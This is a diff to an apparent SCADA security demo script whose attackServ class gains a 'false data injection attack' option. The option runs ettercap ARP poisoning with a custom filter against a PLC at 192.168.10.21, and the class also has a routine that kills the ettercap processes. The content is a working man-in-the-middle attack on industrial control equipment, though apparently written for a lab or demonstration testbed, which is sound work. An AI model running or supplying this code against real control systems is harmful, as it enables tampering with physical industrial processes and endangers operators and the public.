@@ -83,12 +83,18 @@ class attackServ(object):
                 print(str(subprocess.Popen(atkStr, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)))
                 time.sleep(1) # Sleep 1 sec to make sure the ettercap finished scanned the network,.
                 self.changePLC()
+            elif val == '2':
+                print('Starting the false data injection attack:')
+                atkStr = "sudo ettercap -T -q -F /home/pi/scada/demo/m221_1.ef -M ARP /192.168.10.21, 72//"
+                print(str(subprocess.Popen(atkStr, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)))
+                time.sleep(1) # Sleep 1 sec to make sure the ettercap finished scanned the network,.
             else:
                 print('Stopping the attack.')
                 # Find the ettercap process by ID and kill it.
                 for line in os.popen("ps ax | grep ettercap | grep -v grep"):
                     pid = line.split()[0]
                     os.kill(int(pid), signal.SIGKILL) # SIGKILL only in linux. 
+        
 
 #-----------------------------------------------------------------------------
     def startSev(self):
